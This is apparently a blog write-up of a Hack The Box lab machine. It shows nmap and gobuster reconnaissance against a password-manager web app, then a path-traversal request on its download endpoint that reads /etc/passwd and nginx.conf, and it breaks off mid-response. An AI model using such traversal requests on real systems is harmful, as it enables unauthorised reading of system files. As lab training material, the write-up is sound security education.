<!DOCTYPE html>
<html lang="en-US">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  <meta http-equiv="X-Clacks-Overhead" content="GNU Terry Pratchett" />
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
<link rel="shortcut icon" href="http://localhost:1313/images/ability_poisons.jpg" />
<title>HTB Agiu Write-up | Jordan&#39;s Blog</title>
<meta name="title" content="HTB Agiu Write-up" />
<meta name="description" content="A write-up for the Agile box." />
<meta name="keywords" content="HTB,Pentesting," />


<meta property="og:url" content="http://localhost:1313/htb-agiu-write-up/">
  <meta property="og:site_name" content="Jordan&#39;s Blog">
  <meta property="og:title" content="HTB Agiu Write-up">
  <meta property="og:description" content="A write-up for the Agile box.">
  <meta property="og:locale" content="en_US">
  <meta property="og:type" content="article">
    <meta property="article:section" content="blog">
    <meta property="article:published_time" content="2025-03-13T00:00:00+00:00">
    <meta property="article:modified_time" content="2025-03-13T00:00:00+00:00">
    <meta property="article:tag" content="HTB">
    <meta property="article:tag" content="Pentesting">
    <meta property="og:image" content="http://localhost:1313/images/share.png">




  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:image" content="http://localhost:1313/images/share.png">
  <meta name="twitter:title" content="HTB Agiu Write-up">
  <meta name="twitter:description" content="A write-up for the Agile box.">




  <meta itemprop="name" content="HTB Agiu Write-up">
  <meta itemprop="description" content="A write-up for the Agile box.">
  <meta itemprop="datePublished" content="2025-03-13T00:00:00+00:00">
  <meta itemprop="dateModified" content="2025-03-13T00:00:00+00:00">
  <meta itemprop="wordCount" content="1816">
  <meta itemprop="image" content="http://localhost:1313/images/share.png">
  <meta itemprop="keywords" content="HTB,Pentesting">
<meta name="referrer" content="no-referrer-when-downgrade" />

  <style>
  :root {
      --width: 800px;
      --font-main: "Courier New", monospace;
      --font-secondary: "Courier New", monospace;
      --font-scale: 1em;
      --background-color: #fff;
      --heading-color: #222;
      --text-color: #444;
      --link-color: #32ab60;
      --visited-color:  #32ab60;
      --code-background-color: #f2f2f2;
      --code-color: #222;
      --blockquote-color: #222;
      --overflow-wrap: break-word;
  }

  @media (prefers-color-scheme: dark) {
      :root {
          --background-color: #070b0a;
          --heading-color: #32ab60;
          --text-color: #32ab60;
          --link-color: #32ab60;
          --visited-color:  #32ab60;
          --code-background-color: #272822;
          --code-color: #ddd;
          --blockquote-color: #ccc;
      }
  }

  body {
      font-family: var(--font-secondary);
      font-size: var(--font-scale);
      margin: auto;
      padding: 20px;
      max-width: var(--width);
      text-align: left;
      background-color: var(--background-color);
      word-wrap: break-word;
      overflow-wrap: break-word;
      white-space: normal;
      line-height: 1.5;
      color: var(--text-color);
  }

  h1, h2, h3, h4, h5, h6 {
      font-family: var(--font-main);
      color: var(--heading-color);
  }

  a {
      color: var(--link-color);
      cursor: pointer;
      text-decoration: none;
  }

  a:hover {
      text-decoration: underline; 
  }

  nav a {
      margin-right: 8px;
  }

  strong, b {
      color: var(--heading-color);
  }

  button {
      margin: 0;
      cursor: pointer;
  }

  main {
      line-height: 1.6;
  }

  table {
      width: 100%;
  }

  hr {
      border: 0;
      border-top: 1px dashed;
  }

  img {
      max-width: 100%;
  }

  pre {
      white-space: pre-wrap !important;
      overflow-x: auto !important;
      word-break: break-all !important;
      max-width: var(--width) !important;
      margin: 0 !important;
  }

  code {
      font-family: "Courier New", monospace;
      background-color: var(--code-background-color);
      color: var(--code-color);
      white-space: pre-wrap;
      word-wrap: break-word;
      overflow-wrap: anywhere;
  }

  blockquote {
      border-left: 1px solid #999;
      color: var(--code-color);
      padding-left: 20px;
      font-style: italic;
      text-wrap: wrap;
  }

  footer {
      padding: 25px 0;
      text-align: center;
  }

  .title:hover {
      text-decoration: none;
  }

  .title h1 {
      font-size: 1.5em;
  }

  .inline {
      width: auto !important;
  }

  .highlight, .code {
      background-color: var(--code-background-color);
      color: var(--code-color);
      padding: 5px 10px;
      word-break: normal;
      white-space: pre-wrap; 
      overflow-wrap: anywhere;
      overflow-x: auto;
  }

   
  ul.blog-posts {
      list-style-type: none;
      padding: unset;
  }

  ul.blog-posts li {
      display: flex;
  }

  ul.blog-posts li span {
      flex: 0 0 130px;
  }

  ul.blog-posts li a:visited {
      color: var(--visited-color);
</style>

</head>

<body>
  <header><a href="/" class="title">
  <h2>Jordan&#39;s Blog</h2>
</a>
<nav><a href="/">Home</a>


<a href="/blog">Blog</a>

</nav>
</header>
  <main>

<h1>HTB Agiu Write-up</h1>
<p>
  <i>
    <time datetime='2025-03-13'>
      13 Mar, 2025
    </time>
  </i>
</p>

<content>
  <p>We start off by running an <code>nmap</code> scan with scripting enabled, and version detection on all ports</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$sudo nmap -sC -sV -p- 10.10.11.203 -oA Scans/
</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-13 18:42 EDT
</span></span><span style="display:flex;"><span>Nmap scan report for 10.10.11.203
</span></span><span style="display:flex;"><span>Host is up (0.021s latency).
</span></span><span style="display:flex;"><span>Not shown: 65533 closed tcp ports (reset)
</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
</span></span><span style="display:flex;"><span>| ssh-hostkey:
</span></span><span style="display:flex;"><span>|   256 f4:bc:ee:21:d7:1f:1a:a2:65:72:21:2d:5b:a6:f7:00 (ECDSA)
</span></span><span style="display:flex;"><span>|_  256 65:c1:48:0d:88:cb:b9:75:a0:2c:a5:e6:37:7e:51:06 (ED25519)
</span></span><span style="display:flex;"><span>80/tcp open  http    nginx 1.18.0 (Ubuntu)
</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://superpass.htb
</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0 (Ubuntu)
</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span>Nmap done: 1 IP address (1 host up) scanned in 19.54 seconds
</span></span></code></pre></div><p>Only two ports are open - HTTP and SSH. Let&rsquo;s take a look at the webserver. Immediately, the IP is changed to <code>http://superpass.htb/</code>, so we update our <code>/etc/hosts</code> to reflect that. We refresh the page and it resolves
<img src="/images/Agile/website.png" alt="Website"></p>
<p>It says it&rsquo;s a password manager. Let&rsquo;s do some directory fuzzing</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$gobuster dir -u http://superpass.htb -w /usr/share/wordlists/dirb/common.txt -t <span style="color:#ae81ff">300</span>
</span></span><span style="display:flex;"><span>===============================================================
</span></span><span style="display:flex;"><span>Gobuster v3.6
</span></span><span style="display:flex;"><span>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
</span></span><span style="display:flex;"><span>===============================================================
</span></span><span style="display:flex;"><span>[+] Url:                     http://superpass.htb
</span></span><span style="display:flex;"><span>[+] Method:                  GET
</span></span><span style="display:flex;"><span>[+] Threads:                 300
</span></span><span style="display:flex;"><span>[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
</span></span><span style="display:flex;"><span>[+] Negative Status codes:   404
</span></span><span style="display:flex;"><span>[+] User Agent:              gobuster/3.6
</span></span><span style="display:flex;"><span>[+] Timeout:                 10s
</span></span><span style="display:flex;"><span>===============================================================
</span></span><span style="display:flex;"><span>Starting gobuster in directory enumeration mode
</span></span><span style="display:flex;"><span>===============================================================
</span></span><span style="display:flex;"><span>/download             (Status: 302) [Size: 249] [--&gt; /account/login?next=%2Fdownload]
</span></span><span style="display:flex;"><span>/static               (Status: 301) [Size: 178] [--&gt; http://superpass.htb/static/]
</span></span><span style="display:flex;"><span>/vault                (Status: 302) [Size: 243] [--&gt; /account/login?next=%2Fvault]
</span></span><span style="display:flex;"><span>Progress: 4614 / 4615 (99.98%)
</span></span><span style="display:flex;"><span>===============================================================
</span></span><span style="display:flex;"><span>Finished
</span></span><span style="display:flex;"><span>===============================================================
</span></span></code></pre></div><p>We see a <code>download</code> and <code>vault</code>. Very interesting. There is also a login portal on the website. When trying a common credential pair admin:admin, we get a strange result
<img src="/images/Agile/sql.png" alt="Website"></p>
<p>Looks like a SQL error that says lost connection to MySQL. We also see references to Python. There is also information about what looks like the SQL query</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>sqlalchemy.exc.OperationalError: (pymysql.err.OperationalError) (2013, &#39;Lost connection to MySQL server during query&#39;) [SQL: SELECT users.id AS users_id, users.username AS users_username, users.hashed_password AS users_hashed_password FROM users WHERE users.username = %(username_1)s LIMIT %(param_1)s] [parameters: {&#39;username_1&#39;: &#39;admin&#39;, &#39;param_1&#39;: 1}] (Background on this error at: https://sqlalche.me/e/14/e3q8)
</span></span></code></pre></div><p>There is also a function to register a user. After registering, we are taken to a home page <code>/vault</code>
<img src="/images/Agile/register.png" alt="Website"></p>
<p>Let&rsquo;s add a password
<img src="/images/Agile/add.png" alt="Website"></p>
<p>There is a function to export. Let&rsquo;s look at the request in Burp</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-HTTP" data-lang="HTTP"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> /download?fn=hacker_export_91b8681bdb.csv <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">superpass.htb</span>
</span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0</span>
</span></span><span style="display:flex;"><span>Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
</span></span><span style="display:flex;"><span>Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">en-US,en;q=0.5</span>
</span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate, br</span>
</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">keep-alive</span>
</span></span><span style="display:flex;"><span>Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">remember_token=9|dc4f849e4492fdc4dab194ba371d39b00ad86a2e4cdc0a84c66c21ecbdf2360a9324de834cb47170ef1107755fa3a28b174ae50c69e7a0571f1311ab124fc7ab; session=.eJwlzkkOwjAMAMC_5MwhXuqln0FO7AiuLT0h_g4S84J5t_s66ny0_XVcdWv3Z7a9lWOkE-haW4kOJjUSdjcEUAhnR9SUQBiTmEG1AlZZF0ypRclT2Jywp4_JYDFMAITDUSDmGBqblkIP2qi60ApJSHK1uaz9ItdZx3_j7fMFOgkuCA.Z9Nkkw.2MhARMSbEZofegN-_7jUxf3nNEM</span>
</span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>Priority<span style="color:#f92672">:</span> <span style="color:#ae81ff">u=0, i</span>
</span></span></code></pre></div><p>I&rsquo;m mainly interested in the hash after <code>export_</code>. If this is guessable, then we may be able to get passwords from other user&rsquo;s vaults. I submit another request to see how much it changes</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-HTTP" data-lang="HTTP"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> /download?fn=hacker_export_42045271c5.csv <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">superpass.htb</span>
</span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0</span>
</span></span><span style="display:flex;"><span>Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
</span></span><span style="display:flex;"><span>Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">en-US,en;q=0.5</span>
</span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate, br</span>
</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">keep-alive</span>
</span></span><span style="display:flex;"><span>Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">remember_token=9|dc4f849e4492fdc4dab194ba371d39b00ad86a2e4cdc0a84c66c21ecbdf2360a9324de834cb47170ef1107755fa3a28b174ae50c69e7a0571f1311ab124fc7ab; session=.eJwlzkkOwjAMAMC_5MwhXuqln0FO7AiuLT0h_g4S84J5t_s66ny0_XVcdWv3Z7a9lWOkE-haW4kOJjUSdjcEUAhnR9SUQBiTmEG1AlZZF0ypRclT2Jywp4_JYDFMAITDUSDmGBqblkIP2qi60ApJSHK1uaz9ItdZx3_j7fMFOgkuCA.Z9Nkkw.2MhARMSbEZofegN-_7jUxf3nNEM</span>
</span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>Priority<span style="color:#f92672">:</span> <span style="color:#ae81ff">u=0, i</span>
</span></span></code></pre></div><p>Much different. Well, it&rsquo;s downloading a file so this may be a good spot to attempt Local File Inclusion</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-HTTP" data-lang="HTTP"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> /download?fn=../../../../etc/passwd <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">superpass.htb</span>
</span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0</span>
</span></span><span style="display:flex;"><span>Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
</span></span><span style="display:flex;"><span>Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">en-US,en;q=0.5</span>
</span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate, br</span>
</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">keep-alive</span>
</span></span><span style="display:flex;"><span>Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">remember_token=9|dc4f849e4492fdc4dab194ba371d39b00ad86a2e4cdc0a84c66c21ecbdf2360a9324de834cb47170ef1107755fa3a28b174ae50c69e7a0571f1311ab124fc7ab; session=.eJwlzkkOwjAMAMC_5MwhXuqln0FO7AiuLT0h_g4S84J5t_s66ny0_XVcdWv3Z7a9lWOkE-haW4kOJjUSdjcEUAhnR9SUQBiTmEG1AlZZF0ypRclT2Jywp4_JYDFMAITDUSDmGBqblkIP2qi60ApJSHK1uaz9ItdZx3_j7fMFOgkuCA.Z9Nkkw.2MhARMSbEZofegN-_7jUxf3nNEM</span>
</span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>Priority<span style="color:#f92672">:</span> <span style="color:#ae81ff">u=0, i</span>
</span></span></code></pre></div><p>It works!</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>HTTP/1.1 200 OK
</span></span><span style="display:flex;"><span>Server: nginx/1.18.0 (Ubuntu)
</span></span><span style="display:flex;"><span>Date: Thu, 13 Mar 2025 23:19:58 GMT
</span></span><span style="display:flex;"><span>Content-Type: text/csv; charset=utf-8
</span></span><span style="display:flex;"><span>Content-Length: 1744
</span></span><span style="display:flex;"><span>Connection: keep-alive
</span></span><span style="display:flex;"><span>Content-Disposition: attachment; filename=superpass_export.csv
</span></span><span style="display:flex;"><span>Vary: Cookie
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>root:x:0:0:root:/root:/bin/bash
</span></span><span style="display:flex;"><span>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>bin:x:2:2:bin:/bin:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>sys:x:3:3:sys:/dev:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>sync:x:4:65534:sync:/bin:/bin/sync
</span></span><span style="display:flex;"><span>games:x:5:60:games:/usr/games:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>pollinate:x:105:1::/var/cache/pollinate:/bin/false
</span></span><span style="display:flex;"><span>sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>corum:x:1000:1000:corum:/home/corum:/bin/bash
</span></span><span style="display:flex;"><span>dnsmasq:x:108:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>mysql:x:109:112:MySQL Server,,,:/nonexistent:/bin/false
</span></span><span style="display:flex;"><span>runner:x:1001:1001::/app/app-testing/:/bin/sh
</span></span><span style="display:flex;"><span>edwards:x:1002:1002::/home/edwards:/bin/bash
</span></span><span style="display:flex;"><span>dev_admin:x:1003:1003::/home/dev_admin:/bin/bash
</span></span><span style="display:flex;"><span>_laurel:x:999:999::/var/log/laurel:/bin/false
</span></span></code></pre></div><p>A few things we can try from here:</p>
<ol>
<li>Request SSH keys</li>
<li>Request the source code to see how the site is generating the hash at the end of the downloads and attempt to grab another user&rsquo;s vault</li>
<li>Attempt to use PHP wrappers for RCE</li>
<li>Log poisoning</li>
</ol>
<p>Let&rsquo;s go through them starting with the easiest wins. Requesting SSH private keys doesn&rsquo;t result in anything. Requesting <code>nginx.conf</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-HTTP" data-lang="HTTP"><span style="display:flex;"><span><span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">200</span> <span style="color:#a6e22e">OK</span>
</span></span><span style="display:flex;"><span>Server<span style="color:#f92672">:</span> <span style="color:#ae81ff">nginx/1.18.0 (Ubuntu)</span>
</span></span><span style="display:flex;"><span>Date<span style="color:#f92672">:</span> <span style="color:#ae81ff">Thu, 13 Mar 2025 23:26:33 GMT</span>
</span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/csv; charset=utf-8</span>
</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">1447</span>
</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">keep-alive</span>
</span></span><span style="display:flex;"><span>Content-Disposition<span style="color:#f92672">:</span> <span style="color:#ae81ff">attachment; filename=superpass_export.csv</span>
</span></span><span style="display:flex;"><span>Vary<span style="color:#f92672">:</span> <span style="color:#ae81ff">Cookie</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">user www-data;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">worker_processes auto;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">pid /run/nginx.pid;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">include /etc/nginx/modules-enabled/*.conf;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">events {</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">	worker_connections 768;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">	# multi_accept on;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">http {</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">	##</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">	# Basic Settings</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">	##</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">	sendfile on;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">	tcp_nopush on;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">	types_hash_max_size 2048;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">	# server_tokens off;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">	# server_names_hash_bucket_size 64;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">	# server_name_in_redirect off;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">	include /etc/nginx/mime.types;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">	default_type application/octet-stream;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">	##</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">	# SSL Settings</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">	##</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">	ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3; # Dropping SSLv3</span>,<span style="color:#e6db74"> ref: POODLE</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">	ssl_prefer_server_ciphers on;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">	##</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">	# Logging Settings</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">	##</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">	access_log /var/log/nginx/access.log;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">	error_log /var/log/nginx/error.log;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">	##</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">	# Gzip Settings</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">	##</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">	gzip on;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">	# gzip_vary on;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">	# gzip_proxied any;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">	# gzip_comp_level 6;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">	# gzip_buffers 16 8k;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">	# gzip_http_version 1.1;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">	# gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">	##</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">	# Virtual Host Configs</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">	##</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">	include /etc/nginx/conf.d/*.conf;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">	include /etc/nginx/sites-enabled/*;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">#mail {</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">#	# See sample authentication script at:</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">#	# http://wiki.nginx.org/ImapAuthenticateWithApachePhpScript</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">#</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">#	# auth_http localhost/auth.php;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">#	# pop3_capabilities &#34;TOP&#34; &#34;USER&#34;;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">#	# imap_capabilities &#34;IMAP4rev1&#34; &#34;UIDPLUS&#34;;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">#</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">#	server {</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">#		listen     localhost:110;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">#		protocol   pop3;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">#		proxy      on;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">#	}</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">#</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">#	server {</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">#		listen     localhost:143;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">#		protocol   imap;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">#		proxy      on;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">#	}</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">#}</span>
</span></span></code></pre></div><p>We can view the error logs</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">200</span> <span style="color:#a6e22e">OK</span>
</span></span><span style="display:flex;"><span>Server<span style="color:#f92672">:</span> <span style="color:#ae81ff">nginx/1.18.0 (Ubuntu)</span>
</span></span><span style="display:flex;"><span>Date<span style="color:#f92672">:</span> <span style="color:#ae81ff">Thu, 13 Mar 2025 23:34:30 GMT</span>
</span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/csv; charset=utf-8</span>
</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">66532</span>
</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">keep-alive</span>
